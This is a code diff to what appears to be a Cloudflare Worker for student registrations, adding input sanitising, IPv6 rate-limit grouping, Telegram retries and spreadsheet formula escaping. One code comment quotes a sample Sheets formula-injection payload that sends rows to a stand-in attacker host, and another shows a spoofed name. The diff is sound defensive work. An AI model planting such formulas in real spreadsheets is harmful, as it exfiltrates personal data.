@@ -131,20 +131,25 @@ export default {
     }
 
     const sent = await sendToTelegram(env, data, request, suspicious);
+
+    // The sheet write runs either way, and always after the outcome is known,
+    // so a slow or broken Apps Script can never make a good signup look failed.
+    // Writing it even when Telegram refused is the point: it turns a lost
+    // registration into one the owner can still find and follow up.
+    const sheetWrite = appendToSheet(env, data, request, suspicious, !sent);
+    if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(sheetWrite);
+    else await sheetWrite;
+
     if (!sent) {
       // This does cost the student one of their attempts. Refunding it was
       // tried and removed: decrementing the same counter let anyone who could
       // force a failure reset their own limit indefinitely.
       // Never surface Telegram's response; its error text can echo the token.
-      return json({ ok: false, error: 'Could not deliver your registration. Please try again.' }, 502, cors);
+      return json({
+        ok: false,
+        error: 'We have your details but could not confirm them. Please message us on Telegram so we can check.',
+      }, 502, cors);
     }
-
-    // The spreadsheet is a convenience copy, not the record of truth: Telegram
-    // already has this registration. So it runs after the response is decided
-    // and its failure never reaches the student — a slow or broken Apps Script
-    // must not make a successful signup look broken.
-    const sheetWrite = appendToSheet(env, data, request, suspicious);
-    if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(sheetWrite);
 
     return json({ ok: true }, 200, cors);
   },
@@ -218,12 +223,51 @@ function json(body, status, headers) {
   });
 }
 
+/**
+ * Strip what escaping cannot handle.
+ *
+ * esc() stops markup, but it does not stop layout. A name containing newlines
+ * renders as extra lines in the Telegram message, so `Aziza\n\n📢 SYSTEM: pay
+ * to card 8600...` reads like a system notice rather than a student's name.
+ * Bidi overrides let a handle or name be displayed reversed, and lone
+ * surrogates make Telegram reject the whole message with a 400, which costs
+ * the student their registration.
+ *
+ * `keepNewlines` is for the notes field, where real paragraphs are wanted.
+ */
+function sanitise(value, keepNewlines) {
+  let text = String(value);
+
+  // Lone surrogates: Telegram rejects the request outright.
+  text = typeof text.toWellFormed === 'function'
+    ? text.toWellFormed()
+    : text.replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '�');
+
+  // Bidi overrides and isolates, plus zero-width joiners used for spoofing.
+    text = text.replace(/[\u202A-\u202E\u2066-\u2069\u200B-\u200F\uFEFF]/g, '');
+
+  if (keepNewlines) {
+    text = text.replace(/\r\n?/g, '\n')
+      .replace(/[^\S\n]+/g, ' ')     // collapse spaces, keep line breaks
+      .replace(/\n{3,}/g, '\n\n');   // no long blank runs to fake sections
+  } else {
+    text = text.replace(/\s+/g, ' '); // single-line fields stay on one line
+  }
+
+  // Any remaining control characters.
+    return text.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, '').trim();
+}
+
 function validate(payload) {
   const data = {};
   const errors = [];
 
   for (const field of FIELDS) {
-    const value = typeof payload[field.key] === 'string' ? payload[field.key].trim() : '';
+    // Sanitise before the length check, so stripped characters cannot be used
+    // to smuggle a value past `max`.
+    const value = typeof payload[field.key] === 'string'
+      ? sanitise(payload[field.key], field.key === 'notes')
+      : '';
     if (!value) {
       if (field.required) errors.push(`${field.label} is required`);
       continue;
@@ -250,8 +294,10 @@ function validate(payload) {
   if (data.level && !LEVELS.includes(data.level)) {
     errors.push('Level is not valid');
   }
-  if (data.timeline && !/^\d{1,4}$/.test(data.timeline)) {
-    errors.push('Days to goal must be a number');
+  if (data.timeline && (!/^\d{1,4}$/.test(data.timeline) ||
+      Number(data.timeline) < 1 || Number(data.timeline) > 1095)) {
+    // Same bound as the page, so the two cannot disagree.
+    errors.push('Days to goal must be a number between 1 and 1095');
   }
   if (data.source && !SOURCES.includes(data.source)) {
     delete data.source; // optional and cosmetic: drop it rather than reject
@@ -301,8 +347,32 @@ function pickKnown(value, allowed) {
  * IPv4 addresses are used whole.
  */
 function rateLimitScope(ip) {
-  if (!ip.includes(':')) return ip;
-  return ip.split(':').slice(0, 4).join(':') + '::/64';
+  if (!ip.includes(':')) return ip; // IPv4, or the 'unknown' fallback
+
+  // An IPv4-mapped address (::ffff:1.2.3.4) is really one IPv4 host.
+  const mapped = ip.match(/(\d{1,3}(?:\.\d{1,3}){3})$/);
+  if (mapped) return mapped[1];
+
+  // Expand :: before truncating. Cloudflare sends the compressed form, so
+  // slicing the raw string would keep the whole address and defeat the point.
+  const halves = ip.split('::');
+  let hextets;
+  if (halves.length === 2) {
+    const head = halves[0] ? halves[0].split(':') : [];
+    const tail = halves[1] ? halves[1].split(':') : [];
+    const gap = 8 - head.length - tail.length;
+    if (gap < 0) return ip; // malformed; count it whole rather than mis-group
+    hextets = head.concat(new Array(gap).fill('0'), tail);
+  } else {
+    hextets = ip.split(':');
+    if (hextets.length !== 8) return ip;
+  }
+
+  // Normalise so 0, 00 and 0000 land in the same bucket.
+  return hextets
+    .slice(0, 4)
+    .map((h) => (parseInt(h, 16) || 0).toString(16))
+    .join(':') + '::/64';
 }
 
 async function hitRateLimit(env, ip) {
@@ -348,7 +418,10 @@ const MAX_MESSAGE_CHARS = 4000;
 function clip(escaped, limit) {
   if (escaped.length <= limit) return escaped;
   // Back off to before any partially-included &...; sequence.
-  const cut = escaped.slice(0, limit).replace(/&[a-z0-9#]*$/i, '');
+  let cut = escaped.slice(0, limit).replace(/&[a-z0-9#]*$/i, '');
+  // Never end on half of a surrogate pair: Telegram rejects the request as
+  // invalid UTF-8 and the whole registration is lost.
+  if (/[\uD800-\uDBFF]$/.test(cut)) cut = cut.slice(0, -1);
   return cut + '…';
 }
 
@@ -399,7 +472,9 @@ function buildMessage(data, request, suspicious) {
   // on a line boundary keeps the contact details, which are what matter.
   const text = lines.join('\n');
   if (text.length <= MAX_MESSAGE_CHARS) return text;
-  return text.slice(0, MAX_MESSAGE_CHARS - 20).replace(/\n[^\n]*$/, '') + '\n…';
+  let cut = text.slice(0, MAX_MESSAGE_CHARS - 20).replace(/\n[^\n]*$/, '');
+  if (/[\uD800-\uDBFF]$/.test(cut)) cut = cut.slice(0, -1);
+  return cut + '\n…';
 }
 
 async function sendToTelegram(env, data, request, suspicious) {
@@ -409,30 +484,47 @@ async function sendToTelegram(env, data, request, suspicious) {
   }
 
   const url = `https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`;
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: env.CHAT_ID,
-        text: buildMessage(data, request, suspicious),
-        parse_mode: 'HTML',
-        disable_web_page_preview: true,
-      }),
-    });
-    const result = await response.json().catch(() => null);
-    if (!response.ok || !result || !result.ok) {
+  const body = JSON.stringify({
+    chat_id: env.CHAT_ID,
+    text: buildMessage(data, request, suspicious),
+    parse_mode: 'HTML',
+    disable_web_page_preview: true,
+  });
+
+  // Telegram allows roughly 20 messages a minute to one chat. A class
+  // registering together will cross that, and without a retry every student
+  // past the limit loses their registration outright. So retry once, honouring
+  // the retry_after Telegram gives us.
+  for (let attempt = 0; attempt < 2; attempt++) {
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body,
+      });
+      const result = await response.json().catch(() => null);
+
+      if (response.ok && result && result.ok) return true;
+
       // Log the description only. Never log the url, which contains the token.
-      // Status included so `wrangler tail` shows something useful when the
+      // Status is included so `wrangler tail` says something useful when the
       // response is not JSON and `result` is null.
       console.error('Telegram rejected:', response.status, result && result.description);
-      return false;
+
+      const retryable = response.status === 429 || response.status >= 500;
+      if (!retryable || attempt === 1) return false;
+
+      // Cap the wait: the student is holding a spinner.
+      const askedFor = result && result.parameters && result.parameters.retry_after;
+      const waitMs = Math.min((askedFor || 1) * 1000, 8000);
+      await new Promise((resolve) => setTimeout(resolve, waitMs));
+    } catch (error) {
+      console.error('Telegram request failed:', error && error.name);
+      if (attempt === 1) return false;
+      await new Promise((resolve) => setTimeout(resolve, 1000));
     }
-    return true;
-  } catch (error) {
-    console.error('Telegram request failed:', error && error.name);
-    return false;
   }
+  return false;
 }
 
 /**
@@ -444,24 +536,38 @@ async function sendToTelegram(env, data, request, suspicious) {
  * Multi-value fields are joined rather than split across columns so the row
  * shape never changes with the answers.
  */
-function buildRow(data, request, suspicious) {
+/**
+ * Make one value safe to put in a spreadsheet cell.
+ *
+ * Google Sheets evaluates any cell beginning with = + - or @ as a formula, so
+ * a student called `=IMPORTXML("https://evil.example/?"&A2,"//a")` would
+ * exfiltrate the rows above them the moment the owner opened the sheet, and
+ * `=HYPERLINK(...)` would render as a link that looks like it came from us.
+ * A leading apostrophe forces Sheets to treat the cell as text; it is not
+ * displayed. This also keeps "+998..." from becoming #NAME?.
+ */
+function cell(value) {
+  const text = value == null ? '' : String(value);
+  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
+}
+
+function buildRow(data, request, suspicious, undelivered) {
   return [
     new Date().toISOString(),
-    data.name,
-    // Leading ' so Sheets keeps "+998..." as text instead of reading the + as a
-    // formula and showing #NAME?.
-    `'${data.phone}`,
-    '@' + data.telegram.replace(/^@/, ''),
-    data.email || '',
-    data.course,
-    data.level,
-    data.timeline || '',
-    data.reading.join(', '),
-    data.listening.join(', '),
-    data.source || '',
-    data.notes || '',
-    (request.cf && request.cf.country) || '',
-    suspicious ? 'BOT TRAP' : '',
+    cell(data.name),
+    cell(data.phone),
+    cell('@' + data.telegram.replace(/^@/, '')),
+    cell(data.email),
+    cell(data.course),
+    cell(data.level),
+    cell(data.timeline),
+    cell(data.reading.join(', ')),
+    cell(data.listening.join(', ')),
+    cell(data.source),
+    cell(data.notes),
+    cell(request.cf && request.cf.country),
+    // One column, two very different meanings, both needing the owner's eye.
+    undelivered ? 'NOT SENT TO TELEGRAM' : (suspicious ? 'BOT TRAP' : ''),
   ];
 }
 
@@ -472,7 +578,7 @@ function buildRow(data, request, suspicious) {
  * is a copy, and Telegram already holds the registration. Problems show up in
  * `wrangler tail` only.
  */
-async function appendToSheet(env, data, request, suspicious) {
+async function appendToSheet(env, data, request, suspicious, undelivered) {
   if (!env.SHEET_WEBHOOK_URL || !env.SHEET_WEBHOOK_TOKEN) return;
 
   try {
@@ -485,7 +591,7 @@ async function appendToSheet(env, data, request, suspicious) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         token: env.SHEET_WEBHOOK_TOKEN,
-        row: buildRow(data, request, suspicious),
+        row: buildRow(data, request, suspicious, undelivered),
       }),
     });
     if (!response.ok) {
